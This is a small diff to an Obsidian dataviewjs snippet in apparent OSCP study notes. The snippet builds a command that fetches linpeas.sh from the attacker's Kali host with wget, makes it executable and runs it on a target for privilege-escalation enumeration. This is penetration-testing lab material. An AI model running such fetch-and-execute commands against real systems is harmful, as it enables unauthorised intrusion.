@@ -20,12 +20,9 @@ or
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh && wget http://${KaliIP}:8888/parsePEASS.sh`;
+const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`;
 
 dv.paragraph("```bash\n" + command + "\n```");
-```
-```
-chmod +x ./linpeas.sh && chmod +x parsePEASS.sh && ./linpeas.sh
 ```
 
 ---
